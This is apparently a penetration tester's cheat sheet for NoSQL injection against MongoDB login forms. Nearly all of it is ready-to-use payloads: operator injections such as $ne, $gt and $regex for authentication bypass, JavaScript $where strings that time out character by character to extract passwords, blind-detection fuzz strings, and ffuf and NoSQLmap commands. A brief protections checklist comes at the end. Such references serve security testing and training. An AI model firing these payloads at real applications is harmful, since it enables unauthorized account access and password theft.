#whitebox 
- [ ] Identify untrusted data
- [ ] Identify $where and $find query statements
Vulnerable code
```TypeScript
db.users.find({
    email: "<email>",
    password: "<password>"
});
```
Content-Type: application/x-www-form-urlencoded
```bash
param[$op]=val # same as param: param: {$op: val}
email[$regex]=.*&password[$regex]=.*
email=admin%40mangomail.com&password[$ne]=x # admin email and password not equal x
email[$gt]=&password[$gt]= # any string is greater than empty string
email[$gte]=&password[$gte]= # greater than equal
```
Authentication Bypass
```JSON
{"username":{"$regex":"admin.*"},"password":{"$ne":""}}
{"username":{"$eq":"administrator"},"password":{"$ne":"x"}}
{"username":{"$eq":"administrator"},"password":{"$ne":""}}
{"username":{"$eq":"administrator"},"password":{"$gt":""}}
{"username":{"$eq":"administrator"},"password":{"$gte":""}}
```
Query String Exploitation
```json
'||'
'|| '1'=='1
Pets' && 0 && 'x <- use this
Pets' && 1 && 'x <-
admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'


administrator' && this.password.length < 30 || 'a'=='b
administrator'+%26%26+this.password.length+<+9+||+'a'=='b
administrator ' && this.password[0]=='a
admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
```
### Blind
Boolean Based Detection
```JSON
``'"`{ <-
;$Foo} <- all this is one
$Foo \xYZ <-
``'\"`{\r;$Foo}\n$Foo \\xYZ\u0000`` <- FUZZ STRING
'||sleep(100)||'
'||'
'|| '1'=='1
Pets' && 0 && 'x <- use this
Pets' && 1 && 'x <-
{ "$where": "sleep(5000)" }
{ $ne: 'x' }
{ $eq: 'x' }
{ $regex: '^.*'}
{ $regex: '^0.*'} // Returns true if first character is 0
{ $regex: '^1.*'} // Returns true if first character is 1
{ $regex: '^10.*'}
{ "$where":"0" }
{ "$where":"1" }
{ "$where":"Object.keys(this)[0].match('^.{0}a.*')" } // Hidden fields
```
(ffuf) Fuzzing NoSQLi
```bash
ffuf -w /usr/share/seclists/Fuzzing/Databases/NoSQL.txt -u http://vulnerable.com/index.php -d '{ "trackingNum": FUZZ}'
```
(NoSQLmap) Automated NoSQLi
```bash
python2 nosqlmap.py --attack 2 --victim 127.0.0.1 --webPort 80 --uri /index.php --httpMethod POST --postData email,admin@admin.com,password,qwerty --injectedParameter 1 --injectSize 4
```
### Protections
- [ ] String Type Casting on user input, MongoDB has very strict type protections.
- [ ] Query Rewriting
- [ ] Only use $where if it is impossible to express query in another way
- [ ] Disable server-side JavaScript evaluation (enabled by default)